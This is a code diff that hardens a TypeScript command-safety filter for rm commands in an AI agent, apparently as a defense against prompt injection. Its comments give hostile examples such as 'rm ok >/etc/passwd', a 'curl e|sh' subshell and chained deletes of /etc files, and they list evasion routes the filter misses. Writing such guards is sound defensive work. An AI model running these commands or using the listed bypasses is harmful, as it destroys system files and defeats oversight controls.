@@ -4,7 +4,7 @@
  * Rate limiting, path validation, command safety.
  */
 
-import { resolve, normalize } from "path";
+import { resolve, normalize, dirname } from "path";
 import { realpathSync } from "fs";
 import type { RateLimitBucket } from "./types";
 import {
@@ -120,29 +120,94 @@ export function checkCommandSafety(
     }
   }
 
-  // Special handling for rm commands - validate paths
-  // Match rm as a standalone command (not substring like "perform")
-  if (/\brm\s/.test(lowerCommand)) {
+  // Special handling for rm — validate EVERY rm in the command, not just the first,
+  // and fail CLOSED on any target we cannot statically resolve to an allowed path.
+  // Match rm as a standalone command (word boundary — not substring like "perform").
+  // ponytail: best-effort static parse. It cannot see through eval, aliases, a
+  //   $(...)-wrapped rm, base64-decoded payloads, or quoted filenames containing shell
+  //   operators. It is defense-in-depth vs prompt injection, NOT a sandbox — the SDK's
+  //   bypassPermissions PreToolUse gate + ALLOWED_PATHS containment are the real control.
+  if (/\brm\b/.test(lowerCommand)) {
     try {
-      // Extract arguments after rm, stopping at shell operators
-      const rmMatch = command.match(/\brm\s+(.+)/i);
-      if (rmMatch) {
-        // Strip trailing shell redirects/operators before splitting
-        const rawArgs = rmMatch[1]!
-          .replace(/\s*[12]?>.*$/, "") // redirects: 2>&1, >/dev/null, etc.
-          .replace(/\s*[;|&].*$/, "") // operators: ; | && ||
-          .split(/\s+/);
-        for (const arg of rawArgs) {
-          // Skip flags and empty tokens
-          if (arg.startsWith("-") || arg.length <= 1) continue;
-          // Skip shell globs/variables that can't be resolved
-          if (/[*?$`]/.test(arg)) continue;
+      // Split into segments on shell operators so a second/chained rm
+      // (`rm ok; rm /etc/x`, `cat x | rm /etc/x`) is scanned too, not just the first.
+      const segments = command.split(/[;&|\n]+/);
+      for (const segment of segments) {
+        const rmMatch = segment.match(/\brm\s+(.+)/i);
+        if (!rmMatch) continue;
 
-          // Resolve relative paths against WORKING_DIR (where Claude runs)
-          const target = arg.startsWith("/") || arg.startsWith("~")
-            ? arg
-            : resolve(WORKING_DIR, arg);
+        // An output redirect (`>FILE` / `>>FILE`) on the rm is a write-anywhere
+        // primitive that would otherwise ride past the path check — `rm ok >/etc/passwd`
+        // truncates /etc/passwd. Validate every redirect TARGET like an rm target
+        // instead of discarding it. Allow the standard sinks and fd-dups (2>&1).
+        // ponytail: input redirects and process substitution `<(cmd)`/`>(cmd)` are NOT
+        //   containment-checked here — a subshell (`rm x <(curl e|sh)`) runs regardless,
+        //   which is the same accepted shell-execution ceiling as a bare `curl e|sh`.
+        for (const red of rmMatch[1]!.matchAll(/[0-9]*&?>>?\s*(\S+)/g)) {
+          const tgtRaw = red[1]!;
+          if (/^&?[0-9]+$/.test(tgtRaw)) continue; // fd dup: 2>&1, >&2
+          const tgt = tgtRaw.replace(/['"]/g, "");
+          if (/^\/dev\/(null|stdout|stderr)$/.test(tgt)) continue; // std sinks
+          if (/[$`{}]/.test(tgt)) {
+            return [false, `rm redirect to unresolved target: ${tgtRaw}`];
+          }
+          const redTarget =
+            tgt.startsWith("/") || tgt.startsWith("~")
+              ? tgt
+              : resolve(WORKING_DIR, tgt);
+          if (!isPathAllowed(redTarget)) {
+            return [false, `rm redirect target outside allowed paths: ${tgt}`];
+          }
+        }
 
+        // Drop redirect constructs anywhere in the arg list (fd?, optional &, one/two
+        // <>, then the target token) — NOT just trailing ones. A leading redirect like
+        // `>/dev/null /etc/x` must not swallow the real targets after it.
+        const argStr = rmMatch[1]!.replace(
+          /\s*[0-9]*&?[<>]{1,2}\s*\S*/g,
+          " "
+        );
+        for (const raw of argStr.split(/\s+/)) {
+          // The shell removes quotes before rm sees the path, so strip them here too —
+          // otherwise `"/etc/passwd"` reads as a relative (in-tree) token and escapes.
+          const arg = raw.replace(/['"]/g, "");
+          if (!arg || arg.startsWith("-")) continue; // flags / empty tokens
+
+          // Unresolvable shell expansion ($VAR, `cmd`, $(cmd), ${..}, brace lists):
+          // cannot prove the expansion stays in-tree (it can produce `..`), so DENY.
+          // ponytail: also denies a literal filename that really contains $/`/{}` (e.g.
+          //   a single-quoted `'$x'`). Fail-closed is the correct side for a delete gate;
+          //   allowing these chars back would reopen the variable-expansion bypass.
+          if (/[$`{}]/.test(arg)) {
+            return [false, `rm arg with unresolved shell expansion: ${raw}`];
+          }
+
+          // Globs (* ? [): a glob only matches entries under its fixed directory prefix,
+          // so validate that prefix is in-tree instead of skipping the arg entirely.
+          const globIdx = arg.search(/[*?[]/);
+          if (globIdx !== -1) {
+            // A `..` segment AFTER the glob can climb out of the validated prefix
+            // (`/in/tree/x*/../../etc/passwd`), voiding the fixed-prefix guarantee — DENY.
+            if (/(^|\/)\.\.(\/|$)/.test(arg.slice(globIdx))) {
+              return [false, `rm glob with .. escape: ${raw}`];
+            }
+            const prefix = arg.slice(0, globIdx);
+            const dir = prefix.endsWith("/") ? prefix : dirname(prefix);
+            const dirTarget =
+              dir.startsWith("/") || dir.startsWith("~")
+                ? dir
+                : resolve(WORKING_DIR, dir || ".");
+            if (!isPathAllowed(dirTarget)) {
+              return [false, `rm glob outside allowed paths: ${raw}`];
+            }
+            continue;
+          }
+
+          // Plain path — resolve relative to WORKING_DIR (where Claude runs).
+          const target =
+            arg.startsWith("/") || arg.startsWith("~")
+              ? arg
+              : resolve(WORKING_DIR, arg);
           if (!isPathAllowed(target)) {
             return [false, `rm target outside allowed paths: ${target}`];
           }
